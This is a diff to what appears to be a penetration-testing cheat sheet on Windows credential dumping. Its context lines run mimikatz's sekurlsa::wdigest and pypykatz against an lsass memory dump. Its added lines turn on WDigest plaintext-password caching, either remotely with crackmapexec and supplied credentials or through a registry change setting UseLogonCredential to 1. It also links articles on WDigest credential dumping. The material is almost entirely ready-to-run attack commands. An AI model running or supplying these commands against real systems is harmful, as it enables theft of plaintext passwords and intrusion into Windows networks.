@@ -39,7 +39,16 @@ cd C:\Temp\mimikatz\
 C:\Temp\mimikatz\mimikatz.exe "privilege::debug" "log sekurlsa.log" "sekurlsa::wdigest" exit
 ```
 
+### Enabling wgigest
 
+```
+crackmapexec smb <Target_IP> -u '<username>' -p '<password>' -M wdigest -o ACTION=enable
+```
+OR
+```
+reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+```
 
 
 
@@ -49,3 +58,9 @@ Get secrets from memory dump
 ```
 pypykatz lsa minidump --grep lsass.DMP
 ```
+
+
+## Links
+
+- [wdigest](https://www.hackingarticles.in/credential-dumping-wdigest/)
+- [-wdigest-exploration](https://www.jimmwayans.com/mimikatz-exploration-wdigest/)
